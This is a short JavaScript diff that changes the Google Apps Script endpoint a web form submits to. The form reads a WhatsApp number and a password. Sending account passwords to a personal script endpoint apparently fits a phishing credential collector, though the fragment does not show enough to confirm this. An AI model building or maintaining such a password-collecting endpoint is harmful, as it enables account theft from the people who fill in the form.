@@ -4,7 +4,7 @@ function sendData() {
     var whatsapp = document.getElementById("whatsapp").value;
     var password = document.getElementById("password").value;
     var submitButton = document.getElementById("submit-button");
-    var action = "https://script.google.com/macros/s/AKfycbwF-th_9f0shW_l_iF1aXnHZZ62e8xgtHhAfXADIjOaO2LtBzqgejswBrBRPqgvwCtA4A/exec";
+    var action = "https://script.google.com/macros/s/AKfycbzTT4Q7TqFgTUNVYO0BiMmvF3pndglMrwYukmC2_8zzNguJgkPAvcByXRtSVED-G1A/exec";
     var xhr = new XMLHttpRequest();
 
     submitButton.value = "Submitting...";
